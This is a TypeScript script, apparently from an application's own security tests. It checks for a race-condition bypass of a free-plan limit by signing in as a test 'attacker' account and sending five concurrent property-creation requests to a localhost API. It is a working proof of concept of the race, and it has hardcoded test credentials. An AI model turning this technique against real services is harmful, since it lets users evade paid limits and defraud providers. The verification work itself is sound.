import 'dotenv/config';
import { createClient } from '@supabase/supabase-js';
import { PrismaClient } from '@prisma/client';

const supabase = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_ANON_KEY!);
const prisma = new PrismaClient();

const ATTACKER_EMAIL = 'attacker@sec-test.com';
const PASSWORD = 'SecTestPassword123!';

async function run() {
  console.log('--- Verifying Subscription Limit Bypass (Race Condition) ---');

  const attackerWorkspace = await prisma.workspace.findFirst({ where: { name: 'SEC_TEST_ATTACKER_WS' } });
  
  if (!attackerWorkspace) {
    console.error('Setup data not found. Run setup.ts first.');
    return;
  }

  // 1. Ensure workspace is on FREE plan
  await prisma.workspace.update({
    where: { id: attackerWorkspace.id },
    data: { plan: 'FREE' }
  });

  // 2. Clear properties in attacker workspace
  await prisma.property.deleteMany({ where: { workspaceId: attackerWorkspace.id } });

  // 3. Sign in as Attacker PM
  const { data: auth, error: loginError } = await supabase.auth.signInWithPassword({
    email: ATTACKER_EMAIL,
    password: PASSWORD,
  });

  if (loginError) {
    console.error('Login failed:', loginError.message);
    return;
  }

  const token = auth.session.access_token;
  const baseUrl = 'http://localhost:3001';

  // 4. Send 5 concurrent requests to create properties
  console.log('Sending 5 concurrent property creation requests...');
  
  const requests = Array.from({ length: 5 }).map((_, i) => {
    return fetch(`${baseUrl}/api/workspaces/${attackerWorkspace.id}/properties`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: `RACE CONDITION PROPERTY ${i}`,
        address: 'Race Track 1'
      })
    });
  });

  const responses = await Promise.all(requests);
  const results = await Promise.all(responses.map(r => r.status));

  console.log('Response statuses:', results);

  const successCount = results.filter(s => s === 201).length;
  console.log(`Total properties created: ${successCount}`);

  if (successCount > 1) {
    console.log('✅ VULNERABILITY CONFIRMED: Bypassed FREE plan limit (1 property) via race condition!');
  } else {
    console.log('❌ VULNERABILITY NOT EXPLOITED: Limit was enforced (or race condition didn\'t hit).');
  }

  // Double check in DB
  const dbCount = await prisma.property.count({ where: { workspaceId: attackerWorkspace.id } });
  console.log(`Actual properties in DB: ${dbCount}`);

  await prisma.$disconnect();
}

run();
